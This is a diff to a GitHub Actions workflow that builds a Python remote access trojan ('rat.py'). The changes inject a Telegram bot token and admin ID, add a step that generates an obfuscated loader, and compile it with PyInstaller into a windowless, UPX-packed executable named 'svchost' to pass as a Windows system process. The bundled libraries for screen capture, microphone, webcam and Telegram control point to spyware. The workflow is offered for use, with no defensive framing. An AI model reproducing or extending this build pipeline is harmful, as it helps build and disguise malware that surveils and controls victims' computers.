@@ -1,4 +1,4 @@
-name: Build Python Rat EXE
+name: Build Python Rat EXE (Obfuscated)
 
 on:
   workflow_dispatch:
@@ -35,19 +35,14 @@ jobs:
       
       - name: Replace token and admin_id in rat.py
         run: |
-          python -c "
-          import re
-          with open('rat.py', 'r', encoding='utf-8') as f:
-              content = f.read()
-          content = content.replace('{{TOKEN}}', '${{ inputs.token }}')
-          content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}')
-          with open('rat.py', 'w', encoding='utf-8') as f:
-              f.write(content)
-          "
+          python -c "import re; content = open('rat.py', 'r', encoding='utf-8').read(); content = content.replace('{{TOKEN}}', '${{ inputs.token }}'); content = content.replace('{{ADMIN_ID}}', '${{ inputs.admin_id }}'); open('rat.py', 'w', encoding='utf-8').write(content)"
       
-      - name: Build EXE (32-bit, без консоли, с UPX)
+      - name: Generate obfuscated loader
+        run: python build_obfuscated.py
+      
+      - name: Build EXE (Obfuscated)
         run: |
-          pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --upx-dir="C:\ProgramData\chocolatey\lib\upx\tools" --hidden-import telegram --hidden-import telegram.ext --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import tkinter --hidden-import pycaw --hidden-import comtypes --hidden-import cv2 --hidden-import numpy --hidden-import GPUtil --hidden-import win10toast --collect-all telegram rat.py
+          pyinstaller --onefile --windowed --name "svchost" --target-arch x86 --upx-dir="C:\ProgramData\chocolatey\lib\upx\tools" --hidden-import sqlite3 --hidden-import sqlite3.dbapi2 --hidden-import PIL --hidden-import PIL.Image --hidden-import PIL.ImageDraw --hidden-import PIL.ImageFont --hidden-import PIL.ImageFilter --hidden-import PIL.ImageGrab --hidden-import PIL.ImageTk --hidden-import psutil --hidden-import requests --hidden-import sounddevice --hidden-import soundfile --hidden-import cryptography --hidden-import cryptography.fernet --hidden-import cryptography.hazmat --hidden-import cryptography.hazmat.primitives --hidden-import cryptography.hazmat.primitives.hashes --hidden-import cryptography.hazmat.primitives.kdf --hidden-import cryptography.hazmat.primitives.kdf.pbkdf2 --hidden-import comtypes --hidden-import comtypes.client --hidden-import comtypes.gen --hidden-import comtypes.gen._00020430_0000_0000_C000_000000000046_0_2_0 --hidden-import pycaw --hidden-import pycaw.pycaw --hidden-import numpy --hidden-import cv2 --hidden-import GPUtil --hidden-import win10toast --hidden-import tkinter --hidden-import telegram --hidden-import telegram.ext --hidden-import telegram.vendor --hidden-import telegram.vendor.ptb_urllib3 --hidden-import telegram.vendor.ptb_urllib3.urllib3 --collect-all telegram --collect-all cryptography loader_obf.py
       
       - name: Upload EXE
         uses: actions/upload-artifact@v4
